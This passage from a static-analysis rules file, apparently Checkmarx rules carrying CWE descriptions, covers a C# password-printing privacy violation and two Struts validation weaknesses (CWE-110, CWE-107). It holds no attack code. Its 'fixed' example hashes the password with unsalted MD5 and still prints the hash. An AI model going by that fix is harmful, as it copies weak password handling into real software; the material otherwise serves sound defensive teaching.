&lt;li&gt;Review the need and justification of sending personal data to remote web services.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The user's password is written to the screen
      &lt;/h4&gt;&lt;pre&gt;

class PrivacyViolation
{
        static void foo(string insert_sql)
        {
                string password = "unsafe_password";
                insert_sql = insert_sql.Replace("$password", password);
                System.Console.WriteLine(insert_sql);
        } 
}



      &lt;/pre&gt;&lt;h4&gt;
the user's password is MD5 coded before being written to the screen
      &lt;/h4&gt;&lt;pre&gt;

class PrivacyViolationFixed
{
        static void foo(string insert_sql)
        {
                string password = "unsafe_password";
                MD5 md5Hash = System.Security.Cryptography.MD5.Create();
                byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(password));
        StringBuilder md5Password = new StringBuilder();

                for (int i = 0; i &lt; data.Length; i++)
		{
			md5Password.Append(data[i].ToString("x2"));
		}
		insert_sql = insert_sql.Replace("$password", md5Password.ToString());
                System.Console.WriteLine(insert_sql);
        } 
}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_668</key><name>Struts_Validator_Without_Form_Field</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Validator Without Form Field&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;110&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_110_Description" id="oc_110_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Validation fields that do not appear in forms they are
associated with indicate that the validation logic is out of
date.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;It is easy for developers to forget to update validation logic when they
make changes to an ActionForm class. One indication that validation logic is
not being properly maintained is inconsistencies between the action form and
the validation form.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_110_Time of Introduction" id="oc_110_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;li&gt;Operation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_110_Applicable Platforms" id="oc_110_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_110_Common Consequences" id="oc_110_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;It is critically important that validation logic be maintained and
kept in sync with the rest of the application. Unchecked input is the
root cause of some of today's worst and most common software security
problems. Cross-site scripting, SQL injection, and process control
vulnerabilities all stem from incomplete or absent input validation.
&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_110_Demonstrative Examples" id="oc_110_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;An action form with two fields.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;public class DateRangeForm extends ValidatorForm {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;String startDate, endDate;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;public void setStartDate(String startDate) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;this.startDate = startDate;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;public void setEndDate(String endDate) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;this.endDate = endDate;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This example shows an action form that has two fields, startDate and
endDate.&lt;/p&gt;&lt;p class="subheading"&gt;Example 2&lt;/p&gt;&lt;p&gt;A validation form with a third field.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;XML&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;form name="DateRangeForm"&amp;gt;&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;field property="startDate"
depends="date"&amp;gt;&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;arg0 key="start.date"/&amp;gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;/field&amp;gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;field property="endDate" depends="date"&amp;gt;&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;arg0 key="end.date"/&amp;gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;/field&amp;gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;field property="scale"
depends="integer"&amp;gt;&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;arg0 key="range.scale"/&amp;gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;/field&amp;gt;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;/form&amp;gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This example lists a validation form for the action form. The
validation form lists a third field: scale. The presence of the third
field suggests that DateRangeForm was modified without taking validation
into account.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_110_Potential Mitigations" id="oc_110_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;To find the issue in the implementation, manual checks or automated
static analysis could be applied to the xml configuration files.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_110_Other Notes" id="oc_110_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Although J2EE applications are not generally susceptible to memory
corruption attacks, if a J2EE application interfaces with native code that
does not perform array bounds checking, an attacker may be able to use an
input validation mistake in the J2EE application to launch a buffer overflow
attack.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_110_Weakness Ordinalities" id="oc_110_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_110_Relationships" id="oc_110_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;398&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=398" target="_blank"&gt;Indicator of Poor Code Quality&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('110_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_110_Causal Nature" id="oc_110_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_110_Taxonomy Mappings" id="oc_110_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Validator Without Form Field&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_110_Content History" id="oc_110_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Description,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2342</key><name>Struts_Unused_Validation_Form</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Unused Validation Form&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;107&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_107_Description" id="oc_107_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;An unused validation form indicates that validation logic is
not up-to-date.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;It is easy for developers to forget to update validation logic when they
remove or rename action form mappings. One indication that validation logic
is not being properly maintained is the presence of an unused validation
form.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_107_Time of Introduction" id="oc_107_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;li&gt;Operation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_107_Applicable Platforms" id="oc_107_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_107_Potential Mitigations" id="oc_107_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Remove the unused Validation Form from the validation.xml file.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_107_Weakness Ordinalities" id="oc_107_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Resultant&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness is typically related to the presence of some other
weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_107_Relationships" id="oc_107_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;398&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=398" target="_blank"&gt;Indicator of Poor Code Quality&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
